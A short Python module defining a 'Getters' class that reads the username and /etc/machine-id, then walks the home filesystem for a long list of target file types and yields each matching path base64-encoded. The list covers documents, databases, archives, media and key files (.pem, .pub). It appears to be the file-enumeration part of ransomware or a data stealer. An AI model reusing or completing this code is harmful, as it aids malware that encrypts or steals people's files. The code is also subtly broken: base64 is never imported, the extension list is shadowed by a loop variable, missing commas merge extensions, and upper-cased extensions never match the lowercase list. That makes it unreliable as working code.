import os, sys, pwd

class Getters:
	def __init__(self):
		pass

	def get_username(self):
		return pwd.getpwuid(os.getuid())[0]

	def get_MAC(self):
		with open("/etc/machine-id") as machine_file:
			num = machine_file.read()
			if('\n' in num):
				num = num.replace('\n', '')
		return num

	def get_home(self):
		return os.path.expanduser('~')

	def get_path(self, root, name):
		return os.path.join(root, name)

	def get_files(self, path):
		files = [".php", ".html", ".tar", ".gz", ".sql", ".js", ".css", ".txt" ".pdf ", ".tgz", ".war", ".jar", ".java", ".class", ".ruby", ".rar" ".zip",
				".db", ".7z", ".doc", ".pdf ", ".xls", ".properties", ".xml" ".jpg", ".jpeg", ".png", ".gif ", ".mov", ".avi", ".wmv", ".mp3" ".mp4",
				".wma", ".aac", ".wav", ".pem", ".pub", ".docx", ".apk" ".exe",
				".dll", ".tpl", ".psd", ".asp", ".phtml", ".aspx", ".csv"]

		for path, dirs, files in os.walk(path):
			for file in files:
				ext = os.path.splitext(os.path.join(path, file))[1].upper()
				if (ext in files):
					yield base64.b64encode(os.path.join(path, file))

